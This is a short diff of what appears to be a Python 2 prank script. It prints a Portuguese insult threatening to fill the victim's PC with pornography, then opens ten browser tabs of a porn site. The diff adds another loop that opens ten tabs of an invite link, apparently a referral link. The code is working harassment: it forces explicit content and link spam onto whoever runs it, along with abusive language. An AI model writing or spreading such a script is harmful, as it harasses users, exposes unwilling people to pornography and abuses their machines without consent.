@@ -77,4 +77,6 @@ for i in range(9):
 
 print "vou encher teu PC de pornografia agora seu fodido KKKK"
 for i in range(10):
+    webbrowser.open('https://leancoding.co/invite.php?id=BTV724.jpg')
+for i in range(10):
     webbrowser.open('https://xvideos.com')
